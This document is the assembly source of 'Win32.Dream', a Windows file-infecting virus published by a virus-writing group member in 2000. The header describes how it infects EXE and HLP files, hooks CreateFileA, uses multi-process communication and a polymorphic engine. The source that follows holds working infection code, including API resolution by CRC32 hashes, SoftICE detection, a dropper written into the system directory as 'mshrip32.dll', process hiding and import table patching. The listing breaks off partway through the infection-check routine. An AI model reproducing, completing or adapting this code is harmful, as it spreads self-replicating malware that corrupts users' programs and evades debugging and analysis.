
;
;  ÚÄÄÍÍÍÍÍÍÍÍÄÄÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ÄÄÍÍÍÍÍÍÍÍÄÄ¿
;  : Prizzy/29A :		  Win32.Dream		      : Prizzy/29A :
;  ÀÄÄÍÍÍÍÍÍÍÍÄÄÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙÄÄÍÍÍÍÍÍÍÍÄÄÙ
;
;   Hello people, here is my third virus especially when it is designed for
;   whole Win32  platform. It  infects	only EXE (PE - Portable Executable)
;   files and also HLP (Windows Help File Format).
;
;   When infected EXE file is started, EIP goes through my easy polymorphic
;   engine, which isn't so important in this virus, then  hooks CreateFileA
;   function, installs itself  into memory and only  then it can put EIP to
;   the host - there're two returns, one for EXE the other for HLP files.
;
;   With might and mind I wanted to use only it the best from new high-tech
;   vx methods we know. And I think is nothing worst than virus equipped of
;   interprocess communication (IPC). I also changed my coding style and
;   this source is most optimization as I could.
;
;
;			     Detailed Information
;			    ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;
;   1. Interprocess Communication (IPC)
;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   You could see one IPC virus (Vulcano) by Benny/29A but I used this fea-
;   ture other way than he. His IPC virus is only in one process and it can
;   communicate with others viruses in another process.
;
;   The parts of my Win32.Dream virus work in several processes and in fact
;   it behades like one whole virus. After installing to memory, virus will
;   remove itself from memory of the infected program.
;
;
;   1.1. Creating processes
;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   This virus is divided into seven 'independent' functions which have own
;   process. To create new process I would build a dropper and via the Cre-
;   ateProcessA I would run them.
;
;   The dropper wait than new function for its process is ready, if yes, it
;   shares two mapped blocks (OpenFileMappingA) for that process (it's Glo-
;   bal memory and Function's body) and creates thread on the function. The
;   process can't terminate it	can only Sleep.  All created  processed are
;   hiden in Windows 95, not in WinNT/2k (is't more complex).
;
;
;   1.2. IPC in action
;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   Hooked CreateFileA functions  retrieves control, sets  flag for certain
;   process and awakes its. That process  finishes own task and returns re-
;   sults.
;
;
;   1.3. Global memory
;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   It's necessary to share some important information among all processes.
;   There are:
;
;      + [thandle]    : When the dropper will create new thread here is re-
;			turned handle. It indicates the thread's errorcode.
;      + [th_mempos]  : Here is stored the name of the Function's mapped
;			object. The dropper will open that memory area.
;      + [process]    : hProcess, ProcessID values of the all created pro-
;			cesses because of opening/runing them.
;      + [apiz]       : The addresses of the all APIz I call are on this
;			place.
;      + [active]     : If other process wants to run me, sets certain flag
;			here and the thread tests it.
;      + [paramz]     : This is place where the virus store some parameters
;			among processes (see below).
;      + [vbody]      : Here is the copy of the virus, useful for changing
;			values inside and for poly engine.
;      + [filename]   : The future infected filename. New CreateFileA func-
;			tion stores the name here.
;      + [cinfected]  : Two FPU memory buffers, one for creating of the in-
;			fection mark the other for checking.
;      + [poly_vbody] : Output from polymorphic engine.
;
;
;   1.4. Parameters
;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   As I wrote above I have to get some parameters of the input processes.
;   Here is the description of them:
;
;      + [1st param] : Out of polymorhpic engine, the new size of the virus
;      + [2nd param] : Filesize for checksum (+poly size yet).
;      + [3rd param] : The name of the mapped file (for OpenFileMappingA).
;      + [4th param] : a. Filesize for check_infected (without poly size).
;		       b. Out of checksum.
;      + [5th param] : Input for check_infected, if '1', then it wants to
;		       get an angle for create_infected.
;      + [6th param] : Terminate all processes ? (WinNT/2000 only)
;      + [7th param] : Terminate all processes ? (Win95/98   only)
;		       (because of Win95/98 kernel bug)
;
;
;   1.5. Termination of the all processes
;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   I remember it was a nut for me but of course I'd to solve it.  At first
;   I changed flags of the process (SetErrorMode, it means, the process 'll
;   not show any message box if it will do bad instructions), then I had to
;   check if the host lives yet. In Win95/98 I have discovered a kernel bug
;   so that I couldn't use WinNT version (OpenProcess) to check if the host
;   still exists because Win95/98 don't delete its process id handle.
;   Win95 - you can only read some value the from allocated memory by host.
;   WinNT - that allocated memory is opened by other process, you can't
;	    identify if the host still exists.
;
;
;   1.6. The scheme of the all processes
;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;
;    ÉÍÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÍ»
;    ³			 new CreateFileA API function			³
;    ÈÍÄÄÄÄÑÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÍ¼
;	   ³
;	ÉÍÄÄÄÄÄÄÄÄÄÄÄÄÍ»
;	³  infect file	³	ÉÍÄÄÄÄÄÄÄÄÄÄÄÄÄÄÍ»
;	ÈÍÄÑÄÄÄÄÄÄÄÄÄÄÄÍ¼   ÚÄÄÄ   infect HLP	 ³
;	   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ	ÈÍÄÄÄÄÄÄÄÄÄÄÄÄÄÄÍ¼
;	   ³
;	   ³   ÉÍÄÄÄÄÄÄÄÄÍ»
;	   ³   º	  º	   ÚÄÄ [check_infected]
;	   ³   ³	  ÃÄÄÄÄÄÄÄÙ
;	   ³   ³  infect  ÃÄÄÄÄÅÄÄÄÄÄÄ [poly_engine]
;	   ÀÄÄÄ	  ³    ³
;	       ³   EXE	  ÃÄÄÄÄÅÄÄÄÄÄÄ [create_infected]
;	       ³	  ÃÄÄÄÄÄÄÄ¿
;	       º	  º	   ÀÄÄ [checksum]
;	       ÈÍÄÄÄÄÄÄÄÄÄ¼
;
;
;   2. Optimalization and comments
;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   Sometimes I heard my last virus Win32.Crypto is too huge and  also some
;   people had a fun from  me (benny, mort - gotcha bastards!) that my next
;   virus will be bigger than one megabyte. I wanted to  optimize  next one
;   and I've not told them it so I think it'll be  surprise for them I pro-
;   ved. Nevertheless I've a taste of the second side and  now I can return
;   myself without any major problems. But now	I can say the virus is more
;   optimization than benny's bits and pieces. The source  code is not com-
;   mented enough because I think no many  people will taste something like
;   IPC is. If yes, they can contact me.
;
;
;   3. Check infected routine
;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   Long ago in Win32.Crypto I tasted to use  unique math technique  how to
;   check if the file is infected. Now I  thought up new more  complex way.
;   At first from infected file I'll compile the equation, for example:
;		    y = 32*x^7 + 192*x^3 - 8212*x^5 - 72*x
;   and I'll get two points on that curve, for example x1=4 and x2=7.  Then
;   I will calculate  what angle is between the  tangents to the curve from
;   that two points, it  means: I have to  calculate derivation y' of  that
;   equation and if I know y=x1 and y=x2 then I will determine:
;		 & = arc tg | log(x1 - x2) - log(1 + x1*x2) |
;   If the angle will be greater e.g. than 75 degree, file is infected.
;
;   This algorithm has been coded only for fun so that I know we've  easier
;   methods but I couldn't call to remembrance on any.
;
;
;   4. Pearls behind the scene
;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   * Only two weeks before release I've think the virus name up at last.
;   * At a time, during coding, I stopped writing and this virus  I haven't
;     coded for two months. Later when I started again I  couldn't remember
;     what that code does and so on.
;   * In present exists over than fifty backup copies.
;   * The worst part of the virus was the dropper, there were  many changes
;     because of Win9x and WinNT compatibility; many bugs were there.
;   * After a hour of the coding I unwillingly deleted new version. So that
;     I'd to save more than one gigabytes from FAT32 on another  hard disk.
;     Only there I found that lost version.
;   * The best thing I like on the whole virus is main comment.
;   * Working directory was 'E:\X_WIN\' and this file name was 'WIN.AS!'.
;   * Last week I was looking for help on mirc
;	<prizzy> i used also OpenFileMapping, but I think yes; if ...
;	<Bumblebee> mmm
;	<Bumblebee> OpenFileMapping?
;	<prizzy> yes :)
;	<Bumblebee> i've never used it		   [bumble~1.log, 18:59:17]
;     ...but much help I haven't found there (although Bumblebee helped
;     me with another bug).
;   * During whole coding I've read five books and three film scripts.
;
;
;   5. List of greetings
;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;     Darkman	       The master of the good optimistic mood
;     Bumblebee        Thanks for your help during coding
;     Billy Belcebu    So, our communication has started yet
;     GriYo	       All the time busy man
;     Lord Julus       Waiting for your new virus and its meta engine
;     Mort	       So did you think this source will be bigger then
;		       one megabytes? Sorry, maybe later :).
;     J.P.	       I look forward on future with you, dude.
;     Ratter	       No, no. Stop reading and let you show us what you
;		       are hiding inside.
;     VirusBuster      Here is that secret bin with savage poly engine as
;		       you wrote on #virus.
;     Benny	       It the best in the end, benny. Haha, at last this
;		       source is optimized and you will stop to worry me.
;		       Thanks for all you have e'er done for me.
;     ...and for flush, asmodeus, mlapse, mgl, f0re and evul.
;
;
;   6. Contact me
;   ÄÄÄÄÄÄÄÄÄÄÄÄÄ
;     prizzy@coderz.net
;     http://prizzy.cjb.net
;
;
;   (c)oded by Prizzy/29A, June 2000
;
;


		.486p
		.model	flat,STDCALL
		locals
		include include\mz.inc
		include include\pe.inc

		extrn	ExitProcess:proc
		extrn	CreateFileA:proc
		extrn	MessageBoxA:proc

;ÄÄÄ´ prepare to program start ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

.data
		db	?
.code

;ÄÄÄ´ virus code starts here ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

vstart proc
	pusha
	call	$+5
	pop	ebp
	sub	ebp,$-vstart-1			;get delta
    vsize equ file_end - vstart
	mov	eax,[esp+vsize+32]
	sub	eax,1000h
    inf_ep equ $-4
	mov	[ebp+ha_module-vstart],eax
	add	eax,fg0 - vstart + 1000h
    org_ep equ $-4				;get startup address
	push	eax
	call	get_k32_apis
	jmp	__return
    @anti_e:
	call	kill_st
	call	check_resident			;try to create it
	call	create_process_maps
	.if byte ptr [ebp+error-vstart] == 0
	call	hookapi
	.endif

    __return:
	pop	dword ptr [esp+28]
	popa
	sub	esp,-vsize-4
	db	90h,90h
	jmp	eax				;exe back
	xor	eax,eax 			;hlp back
	ret	8
vstart endp

get_k32_apis proc
	push	20
	mov	eax,[esp+vsize+48]		;find k32 address
	sub	ax,ax
	pop	ecx
    @@1:.if word ptr [eax] != 'ZM'
	sub	eax,65536
	loop	@@1
	jmp	gk32a_f_a
	.endif
	cmp	byte ptr [ebp+__return+11-vstart],90h
	jz	$+5
	pop	eax
	jmp	__return
	push	eax eax 			;get k32 tables
	add	eax,[eax+60]
	pop	ebx edi
	add	ebx,[eax+78h]
	mov	cl,0
    @@3:push	ebx ecx
	mov	edx,[ebx+32]
	add	edx,edi
    @@4:mov	esi,[edx]			;calculate next crc32 func.
	add	esi,edi
	push	ecx edx ebx			;crc32 algorithm
	stc
	sbb	ecx,ecx
	mov	edx,ecx
    @@4_crc32_nByte:
	sub	eax,eax
	sub	ebx,ebx
	lodsb
	xor	al,cl
	mov	cl,ch
	mov	ch,dl
	mov	dl,dh
	mov	dh,8
    @@4_crc32_nBit:
	shr	bx,1
	rcr	ax,1
	jnc	@@4_crc32_no
	xor	ax,08320h
	xor	bx,0edb8h
    @@4_crc32_no:
	dec	dh
	jnz	@@4_crc32_nBit
	xor	ecx,eax
	xor	edx,ebx
	cmp	byte ptr [esi-1],0
	jnz	@@4_crc32_nByte
    @@4_crc32_fin:
	not	edx
	not	ecx
	pop	ebx
	mov	eax,edx
	rol	eax,16
	mov	ax,cx
	pop	edx ecx
	cmp	[ebp+k32_crcs+ecx*4-vstart],eax ;crc32 == my func ?
	jz	@@5
	sub	edx,-4
	jmp	@@4
    gk32a_f_a:
	jmp	gk32a_f
    @@3_a:
	jmp	@@3
    @@5:sub	edx,[ebx+32]			;get addr of the new func.
	sub	edx,edi
	shr	edx,1
	add	edx,[ebx+36]
	add	edx,edi
	movzx	edx,word ptr [edx]
	shl	edx,2
	add	edx,[ebx+28]
	mov	edx,[edx+edi]
	add	edx,edi
	pop	ecx ebx
	movzx	eax,word ptr [ebp+ecx*2+k32_addrs-vstart]
	neg	ax
	mov	[ebp+eax],edx			;store its
   @@5a:inc	ecx
	mov	eax,edi
	rol	eax,8
	sub	al,0BFh
	jz	@@5b
	cmp	ecx,14
	jz	@@5a
   @@5b:cmp	ecx,count
	jnz	@@3_a
	push	p_number+1			;update Sleep function
	pop	ecx
    @@6:movzx	eax,word ptr [ebp+process_maps+ecx*2-vstart-2]
	neg	ax
	mov	[ebp+eax+2],edx
    @@7:loop	@@6
	test	al,0C3h
    gk32a_f equ $-1
	pop	eax
	push	cs				;anti-emulator
	lea	eax,[ebp+@anti_e-vstart]
	push	eax
	retf
get_k32_apis endp

kill_st proc
	call	@sNT+10
   @s95:db '\\.\SICE',0 			;name drivers
   @sNT:db '\\.\NTICE',0
	pop	ebx
	call	open_file			;open SoftICE 95/98 or
	jz	@ks_nt				;     SoftICE NT/2k driver
	dec	eax
	push	eax
	mov	eax,0
   lpCloseHandle equ $-4
	call	eax
	jmp	@ks_kill			;kill process
   @ks_nt:
	sub	ebx,@s95-@sNT			;open the second driver
	call	open_file
	jz	@ks_dos
	dec	eax
	call	[ebp+lpCloseHandle-vstart]
   @ks_kill:
	push	eax
	mov	eax,0
   lpExitProcess equ $-4
	call	eax
   @ks_dos:
	cmp	dword ptr fs:[32],0		;TD32 etc.
	jnz	@ks_kill
	ret

   open_always_file:
	sub	eax,eax 			;create file always
	push	eax				;useful for droppers
	mov	cl,80h
	push	ecx 2
	jmp	$+8
   open_file:
	sub	eax,eax 			;open file in ebx
	push	eax edx 3
	cdq
	mov	dl,0C0h
	bswap	edx
	push	eax eax edx ebx
	mov	eax,0
   lpCreateFile equ $-4
	call	eax
	inc	eax
	ret
kill_st endp

check_resident proc
	push	ebp 1 0 			;create mutex or get if it
	mov	eax,0				;has been created => in mem
   lpCreateMutexA equ $-4
	call	eax
	xchg	eax,ebx
	mov	eax,0
  lpGetLastError equ $-4
	call	eax
	xchg	eax,esi
	or	esi,esi
	jz	@cr_f
	push	ebx
	mov	eax,0
   lpReleaseMutex equ $-4
	call	eax
  @cr_f:or	esi,esi
	pop	eax
	jnz	__return
	jmp	eax
check_resident endp

create_process_maps proc
	mov	byte ptr [ebp+error-vstart],1
	call	build_dropper			;create dropper in sys dir
	jc	cpm_fnodeal
	mov	eax,0
   lpGetCurrentProcessId equ $-4
	call	eax
	mov	[ebp+if_parent-vstart],eax
	sub	ebx,ebx
	push	80h
   cpm_shared_mem equ $-4
	push	7
	mov	eax,0
   lpSetErrorMode equ $-4
	call	eax
	pop	ecx
	lea	edi,[ecx+vbody]
	push	ecx
	mov	esi,ebp
	mov	ecx,vsize
	rep	movsb
   cpm_nxproc:
	pop	eax
	lea	edi,[eax+8+ebx*8]
	push	eax
	mov	[eax],edi
	call	@@1
	dd	0,0,0,0 			;hProc, hThr, ProcID, ThrID
    @@1:pop	esi
	lea	eax,[ebp+vsize]
	push	esi eax 68
	pop	ecx
   @@1a:mov	[eax],ch
	inc	eax
	loop	@@1a
	push	ecx ecx 640 1 ecx ecx 80h ecx
   cpm_cmdline equ $-5
	inc	ecx
	mov	dword ptr [eax-6*4],ecx
	mov	eax,0
   lpCreateProcessA equ $-4
	call	eax
	or	eax,eax
	jz	cpm_failed
	lodsd					;get hProcess and ProcessID
	stosd
	lodsd
	lodsd
	mov	edx,eax
	stosd
	movzx	esi,word ptr [ebp+process_maps+ebx*2-vstart]
	neg	si
	add	esi,ebp
	movzx	ecx,word ptr [esi-2]
	mov	eax,4096
	call	malloc
	xchg	eax,edi
	rep	movsb				;copy one to mem
	pop	esi
	push	esi
	movzx	eax,byte ptr [ebp+m_sign-2-vstart]
	mov	[esi+4],eax			;thread memory sign
	mov	[esi],ecx			;active flag
	push	esi count-2
	lea	edi,[esi+apiz]
	lea	esi,[ebp+k32_addrs-vstart]
	pop	ecx
    @@2:sub	eax,eax
	lodsw
	neg	ax
	mov	eax,[ebp+eax]
	stosd
	loop	@@2
	pop	esi
	push	edx ecx 1F0FFFh
	mov	eax,0
	lpRegisterServiceProcess equ $-4
	or	eax,eax
	jz	cpm_winnt
	push 1 edx
	call	eax
   cpm_winnt:
	mov	eax,0
   lpOpenProcess equ $-4			;create inside thread from
	call	eax				;the dropper
	xchg	eax,ecx
	jecxz	cpm_failed
	mov	edx,0
   lpWaitForSingleObject equ $-4
	call	edx, ecx, 40
	lodsd
	not	eax
	xchg	eax,ecx
	jecxz	cpm_failed
	inc	ebx
	cmp	bl,p_number
	jnz	cpm_nxproc
	mov	al,bh				;remove the virus from the
	mov	ecx,(mem_end - newCreateFile)	;current file, live on the
	lea	edi,[ebp+newCreateFile-vstart]	;other places inside win32
	rep	stosb
	mov	byte ptr [ebp+error-vstart],cl
   cpm_failed:
	pop	eax
	or	ebx,ebx
	jnz	cpm_fnodeal
	call	mdealloc
   cpm_fnodeal:
	mov	eax,[ebp+cpm_cmdline-vstart]
   mdealloc:
	push	eax				;deallocate shared memory
	mov	eax,0
   lpUnMapViewOfFile equ $-4
	call	eax
	ret
   error db 0
create_process_maps endp

build_dropper proc
	mov	eax,260 			;generate dropper filename
	call	malloc
	mov	[ebp+cpm_cmdline-vstart],eax
	mov	edi,eax
	push	7Fh eax 			;no more then 0x80 chars
	mov	eax,0
   lpGetSystemDirectory equ $-4
	call	eax				;get system directory
	or	eax,eax
	jz	bd_failed
	call	bd_fname
	db	'\mshrip32.dll',0		;hmmm, my dropper name
     bd_fname:
	pop	esi
	push	14
	mov	ebx,edi
	add	edi,eax
	pop	ecx
	rep	movsb
	call	open_always_file		;create its
	jz	bd_failed
	dec	eax
	push	eax
	mov	esi,1024			;alloc memory for dropper
	call	malloc
	xchg	eax,edi 			;edi=output, all is zero
	mov	eax,60000
	push	edi
	lea	esi,[ebp+dropper_data-vstart]
	call	malloc
	xchg	ebx,eax
	mov	[ebp+cpm_shared_mem-vstart],ebx
	mov	eax,0
   lpGetVersion equ $-4
	call	eax
	xor	ecx,ecx
	bt	eax,63
	adc	edi,ecx
	mov	[ebx+paramz+(7-1)*4],edi
	pop	edi
	push	edi
	mov	al,[ebp+m_sign-2-vstart]
	mov	[esi+224],al			;noone knows what is it
      bd_read:					;create EXE PE dropper
	xor	eax,eax
	lodsb
	cmp	al,-1				;end of data?
	jz	bd_done
	add	edi,eax 			;next movement
	lodsb
	xchg	eax,ecx
      bd_write:
	lodsb
	stosb					;save data
	loop	bd_write
	jmp	bd_read
	E8	equ 0E8
      bd_done:
	push	0
	call	@@2
	dd	?
    @@2:push	1024
	push	dword ptr [esp+12]		;droppers body
	push	dword ptr [esp+20]		;file handle
	mov	eax,0
   lpWriteFile equ $-4
	call	eax
	push	eax dword ptr [esp+8]
	call	[ebp+lpCloseHandle-vstart]
	pop	ecx eax eax			;write error ?
	jecxz	bd_failed
	test	al,0F9h
      bd_failed equ $-1
	ret

   radix 16			   ;compressed [dropper EXE(PE) 1024 bytes]
   dropper_data equ this byte
	db 0,5,4Dh,5A,90,0,3,3,1,4,3,2,0FF,0FF,2,1,0B8,7,1,40,23,1,0C0,83,2
	db 50,45,2,8,4C,1,1,0,7F,6A,4,38,8,7,0E0h,0,0Fh,1,0Bh,1,6,6,1,2,6,2
	db 0C,10,3,1,10,3,1,10,4,1,40,2,1,10,3,1,2,2,1,4,7,1,4,8,1,20,3,1,2
	db 2,2,0E6,3Bh,2,1,2,5,1,10,2,1,10,4,1,10,2,1,10,6,1,10,0Bh,2,88,10
	db 2,1,28,54,1,10,2,1,8,1Bh,4,2Eh,32,39,41,4,1,0C8,4,1,10,3,1,2,3,1
	db 2,0E,1,40,2,1,0C0,20,2,0B8h,10,0A,7E,0E8,45,0,0,0,96,0E8,0,0,0,0
	db 5Dh,89,75,9,0EBh,2,90,90,0BBh,0,0,0,0,83,3Bh,0,75,1E,66,0C7,45,6
	db 0EBh,28,0E8,1E,0,0,0,33,0C9,53,51,53,50,51,51,0B8,0,0,0,0,-1,0D0
	db 0F7,0D0,89,3,6A,0A,0B8,0,0,0,0,0FF,0D0h,0EBh,0CBh,0ADh,56,0EBh,7
	db 0E8,2,0,0,0,41,0,33,0F6,0BF,1F,0,0F,0,6A,1,57,0B8,0,0,0,0,-1,0D0
	db 56,56,56,57,50,0B9,0,0,0,0,-1,0D1,0C3,E8,0,0,0,0,-1,25,0,10,40,0
	db 0,0,0B0,10,0A,2,0BEh,10,3,1,10,16,2,0B8,10,6,0Fh,96,1,50,69,65,0
	db 47,44,49,33,32,2E,64,6C,6C,0FF
   radix 10

build_dropper endp

malloc proc
	pusha					;allocate shared memory
	xchg	ebx,eax
	sub	esi,esi
	inc	byte ptr [ebp+m_sign-2-vstart]
	call	m_sign
	db	"@",0
   m_sign:
	push	ebx esi 4 esi 0-1
	mov	eax,0
   lpCreateFileMappingA equ $-4
	call	eax
	dec	eax
	jz	m_failed
	inc	eax
	push	ebx esi esi 2 eax
	mov	eax,0
   lpMapViewOfFile equ $-4
	call	eax
   m_failed:
	mov	[esp+28],eax
	popa
	or	eax,eax
	ret
malloc endp

hookapi proc
	mov	ebx,0
    ha_module equ $-4
	cmp	word ptr [ebx],'ZM'
	jnz	ha_failed
	movzx	esi,word ptr [ebx+60]
	add	esi,ebx
	cmp	word ptr [esi],'EP'
	jnz	ha_failed
	mov	eax,[esi+80h]
	add	eax,ebx
   fk32:mov	esi,eax
	mov	esi,[esi+12]
	cmp	[esi+ebx],'NREK'
	jz	fkok
	sub	eax,-20
	jmp	fk32
   fkok:mov	edx,[eax+16]
	add	edx,ebx
	cmp	dword ptr [eax],0
	jz	ha_failed
	push	edx
	mov	esi,[eax]
	add	esi,ebx
	mov	edx,esi
	sub	eax,eax
   fklp:cmp	dword ptr [edx],0
	jz	ha_failed2
	cmp	dword ptr [edx+3],80h
	jz	finc
	mov	esi,[edx]
	lea	esi,[esi+ebx+2]
	call	fnam
	db	"CreateFileA",0
   fnam:pop	edi
   fcom:push	12
	pop	ecx
	repe	cmpsb
	jecxz	fapi
   finc:inc	eax
	sub	edx,-4
	jmp	fklp
   fapi:shl	eax,2
	add	eax,[esp]
	xchg	ebx,eax
	mov	eax,[ebx]
	mov	ecx,[ebp+cpm_shared_mem-vstart]
	mov	[ecx+vbody+newCreateFile+1-vstart],eax
	lea	eax,[ecx+vbody+newCreateFile-vstart]
	mov	[ebx],eax
	pop	ecx
	ret
   ha_failed2:
	pop	eax
   ha_failed:
	pop	eax
	jmp	__return
hookapi endp

	db	" Win32.Dream, (c)oded by Prizzy/29A ",13,10
	db	" The greetz go to all 29A vx coderz ",13,10

newCreateFile proc
	push	80h
   oldCreateFile equ $-4
	pusha
	call	$+5
	pop	ebp
	sub	ebp,$-vstart-1
	mov	ebx,[ebp+cpm_shared_mem-vstart]
	lea	edi,[ebx+vbody+vsize]
	mov	word ptr [edi-vsize+__return+11-vstart],9090h
	mov	esi,[esp+7*4+12]
   ncfc:lodsb
	stosb
	or	al,al
	jnz	ncfc
	lea	edi,[ebx+active]
	lea	esi,[ebx+process]		;infect_file hProcess, ProcID
	lodsd
	xchg	ebx,eax
	lodsd
	mov	byte ptr [edi],1		;active thread
	push	eax 0 1F0FFFh
	call	[ebp+lpOpenProcess-vstart]
	xchg	eax,ecx
	jecxz	ncf_failed
   ncfw:push	40 ebx
	call	[ebp+lpWaitForSingleObject-vstart]
	cmp	byte ptr [edi],0
	jnz	ncfw
   ncf_failed:
	popa
	ret
newCreateFile endp

start_thread macro thread
	pusha					;threads gdelta
	push	80h				;Sleep function
	call	$+5
	pop	ebp
	sub	ebp,$-thread-1
	mov	esi,[esp+40]
   IFE st_count NE 0
     if_shared_mem equ $-4
	push	80h 0 1F0FFFh
     if_parent equ $-11
	call	[esi+apiz+12*4] 		;OpenProcess
	xchg	eax,esi
	xchg	eax,ebx
	or	esi,esi
	jnz	$ + 11				;terminate all processes
	inc	esi
	mov	[ebx+paramz+(6-1)*4],esi
	jmp	ifex
	push	esi
	call	[ebx+apiz+1*4]			;CloseHandle
	mov	esi,ebx
   ELSE
	push	1
	pop	edi
	cmp	[esi+paramz+(6-1)*4],edi	;terminate this process?
	jnz	$ + 4
	jmp	edi
   ENDIF
	mov	eax,[esi+paramz+(7-1)*4]
	test	al,1
	jz	$ + 4
	mov	al,[eax]
	lea	edi,[esi+active+st_count]
	push	edi
	cmp	byte ptr [edi],0
	jz	@@end
endm

st_count = 0

end_thread macro thread
	st_count = st_count + 1
	mov	edi,[esp]
	mov	byte ptr [edi],0
  @@end:pop	edi eax 			;sleep function
	call	eax, 2
	popa					;don't terminate
	jmp	thread
endm

	dw	check_infected-infect_file
infect_file proc
	start_thread infect_file
	lea	esi,[ebx+vbody+vsize]
   ifex:lodsb
	cmp	al,'.'
	jnz	ifex
	dec	esi
	lodsd
	or	eax,20202020h
	mov	ebx,[esp+44]
	lea	edi,[ebx+active+4]
	lea	esi,[ebx+process+8*4]		;infect_exe hProcess, ProcID
	cmp	eax,'exe.'
	jz	if_2
	cmp	eax,'plh.'
	jnz	if_failed
   if_call_hlp:
	sub	esi,8				;infect_hlp
	dec	edi
   if_2:lodsd
	push	eax
	lodsd
	mov	byte ptr [edi],1		;active infect_exe (_hlp)
	push	eax 0 1F0FFFh
	call	[ebx+apiz+4*12] 		;OpenProcess
	xchg	eax,ecx
	jecxz	if_failed - 1
   if_r:pop	eax
	push	eax 40 eax
	call	[ebx+apiz+4*13] 		;WaitForSingleObject
	cmp	byte ptr [edi],0
	jnz	if_r
	pop	eax
   if_failed:
	end_thread infect_file
infect_file endp

	dw	create_infected-check_infected
check_infected proc
	start_thread check_infected
	xchg	ebx,esi
	xor	esi,esi
	cmp	[ebx+paramz+(5-1)*4],1
	jz	ci_nomem

   other_process_mem macro shared_mem, param	;get mem from other process
	call	$ + 7
	db	"1",0
	push	1 4
	call	[shared_mem+apiz+24*4]		;OpenFileMappingA
	xor	ecx,ecx
	push	eax ecx ecx ecx 4 eax
	call	[shared_mem+apiz+7*4]		;MapViewOfFile
	push	eax
	xchg	eax,esi
   endm

	other_process_mem ebx, 4

   ci_nomem:
	add	esi,[ebx+paramz+(4-1)*4]
	mov	ecx,[esi-4-tbyte]		;number of the terms in a
	or	ecx,ecx 			;equation
	jz	ci_failed
	cmp	ecx,8
	jnbe	ci_failed
	sub	esp,128
	fsave	[esp]
	push	ecx
	imul	ecx,-(tbyte+tbyte)
	sub	ecx,tbyte+tbyte+4+tbyte
	lea	esi,[esi+ecx]			;data starts here
	lea	edi,[ebx+vbody+vsize+260]
	cmp	[ebx+paramz+(5-1)*4],1
	jnz	$ + 8
	lea	edi,[ebx+vbody+vsize+260+ci_size/2]
	neg	ecx
	push	edi
	rep	movsb
	pop	esi ecx
	push	ecx esi
	fld	tbyte ptr [esi+tbyte]		;derivation of the equations
	fld	st(0)				;you'll get two tangents
	fld	tbyte ptr [esi]
	fmul
	fld1
	fsubp	st(2),st
	fstp	tbyte ptr [esi]
	fstp	tbyte ptr [esi+tbyte]
	sub	esi,-(tbyte+tbyte)
	loop	$ - 21
	pop	esi ecx
	sub	esp,tbyte+tbyte
	fldz
	fldz
	fstp	tbyte ptr [esp]
	fstp	tbyte ptr [esp+tbyte]
	push	esi ecx
	imul	eax,[esp],tbyte+tbyte		;involution of the equations
	fld	tbyte ptr [esi]
	fld	tbyte ptr [esi+tbyte]
	fld	tbyte ptr [esi+eax+tbyte]
	fld	tbyte ptr [esi+eax]
	fld	st(2)
	fld	st(4)
	fxch	st(2)
	lea	edx,[ebp+($+32)-check_infected]
	push	edx
	fyl2x					;over natural logarithm
	fld	st(0)
	frndint
	fsubr	st(1),st
	fxch
	fchs
	f2xm1
	fld1
	faddp
	fscale
	fstp	st(1)
	fmul
	ret
	fld	tbyte ptr [esp+tbyte+2*dword]
	faddp
	fstp	tbyte ptr [esp+tbyte+2*dword]
	call	$ - 35			      ;we've two points on the curve
	fld	tbyte ptr [esp+2*dword]
	faddp
	fstp	tbyte ptr [esp+2*dword]
	sub	esi,-(tbyte+tbyte)
	dec	dword ptr [esp] 		;next term in the equation
	jnz	$ - 85
	pop	ecx ecx
	fld	tbyte ptr [esp+tbyte]		;calculate an angle of the
	fld	tbyte ptr [esp] 		;two tangents of the equation
	fld	st(1)
	fld	st(1)
	fsub
	fxch	st(2)
	fmul
	fld1
	fadd
	fdiv
	fabs
	fld1
	fpatan
	push	180				;radian -> angle
	fimul	dword ptr [esp]
	fldpi
	fdiv
	pop	eax
	sub	esp,-(tbyte+tbyte)
	mov	eax,2*tbyte+dword
